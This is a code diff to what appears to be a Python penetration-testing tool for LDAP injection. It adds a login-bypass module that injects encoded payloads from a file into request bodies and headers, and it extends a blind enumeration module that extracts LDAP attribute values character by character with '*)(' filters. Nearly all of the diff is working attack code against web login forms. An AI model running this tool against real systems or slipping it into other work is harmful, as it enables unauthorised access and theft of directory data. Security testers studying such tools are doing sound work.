@@ -8,8 +8,7 @@ import Burpee.burpee
 import logging
 import traceback
 import argparse
-from urllib.parse import urlparse, urlunparse
-from urllib.parse import parse_qs
+from urllib.parse import urlparse, quote_plus, parse_qs
 import json
 import re
 import urllib3
@@ -40,8 +39,43 @@ def login(args, url_str, header_json, data_json, proxy, method, form="json"):
   data_json: json
   """
 
+  with open("payloads.txt", 'r', encoding='utf-8') as infile:
+    for line in infile:
+      query = "{}".format(line)
+      # if base64 encoded:
+      if args.encode == "base64":
+        query = base64.b64encode(query.encode("utf-8")).decode("utf-8")
+      elif args.encode == "url":
+        query = quote_plus(query)
+      else:
+        # workaround: escaping " with \"
+        query = query.replace("\"", "\\\"")
 
+      logging.debug("payload: {}".format(query))
 
+      data_json_t = data_json
+      try:
+        data_str = json.dumps(data_json).replace(args.insertionTag, query)
+        data_json_t = json.loads(data_str)
+      except:
+        print("\n[-] Warning: Payload processing failed in query {}".format(query))
+      
+      header_json_t = header_json
+      try:
+        header_str = json.dumps(header_json).replace(args.insertionTag, query)
+        header_json_t = json.loads(header_str)
+      except:
+        print("\n[-] Warning: Payload processing failed in query {}".format(query))
+
+      # prepare and send the request
+      r = send(args, url_str, header_json_t, data_json_t, proxy, method, form)
+      print("\t\t\t\t\t -> {}\r{}".format(r.status_code, line.replace("\n", "")))
+
+      # TODO: implement smart trigger
+      if "Cannot login" in r.text and not ("not valid" in r.text or "Malformed" in r.text):
+        break
+
+      
 
 def enum(args, url_str, header_json, data_json, proxy, method, form="json"):
   """ 
@@ -58,12 +92,13 @@ def enum(args, url_str, header_json, data_json, proxy, method, form="json"):
     finish = False
     while not finish:
       for char in alphabet: #In each possition test each possible printable char
-        sys.stdout.write(f"\r{attribute}: {value}{char}")
         query = "*)({}={}{}*".format(attribute, value, char)
 
         # if base64 encoded:
-        if args.encode:
+        if args.encode == "base64":
           query = base64.b64encode(query.encode("utf-8")).decode("utf-8")
+        elif args.encode == "url":
+          query = quote_plus(query)
         else:
           # workaround: escaping " with \"
           query = query.replace("\"", "\\\"")
@@ -86,7 +121,9 @@ def enum(args, url_str, header_json, data_json, proxy, method, form="json"):
 
         # prepare and send the request
         r = send(args, url_str, header_json_t, data_json_t, proxy, method, form)
+        sys.stdout.write(f"\r{attribute}: {value}{char}")
 
+        # TODO: implement smart trigger
         if "Cannot login" in r.text and not ("not valid" in r.text or "Malformed" in r.text):
           value += str(char)
           break
@@ -172,8 +209,8 @@ def main():
   parser.add_argument('-t', '--tag', dest="insertionTag", type=str, default='<>', help="Insertion point. Default *. Marks the spot for LDAP insertion.")
   parser.add_argument('--protocol', dest='protocol', type=str, default='https', help="The protocol to user: https or http. Default https.")
   parser.add_argument('--proxy', dest='proxy', type=str, default='', help="Use a proxy to connect to the target URL. Example: --proxy 127.0.0.1:8080")
-  parser.add_argument('--encode', dest='encode', action='store_true', help="Base64-encode the payload.")
-  parser.add_argument('--module', dest='module', type=str, default='enum', help="The module to use: login (TODO), enum, dump (TODO)")
+  parser.add_argument('--encode', dest='encode', type=str, default='base64', help="Encode the payload: base64, url")
+  parser.add_argument('--module', dest='module', type=str, default='enum', help="The module to use: login, enum, dump (TODO)")
   parser.add_argument('--method', dest='method', type=str, default='', help="Force using a given HTTP method.")
   parser.add_argument('--loglevel', dest='loglevel', default='WARNING', help="DEBUG, INFO, WARNING, ERROR")
   args = parser.parse_args()
@@ -224,6 +261,8 @@ def main():
   if args.module == 'enum':
     enum(args, url_str, header_json, data_json, proxy, method, form)
 
+  elif args.module == 'login':
+    login(args, url_str, header_json, data_json, proxy, method, form)
 
 if __name__ == '__main__':
   try:
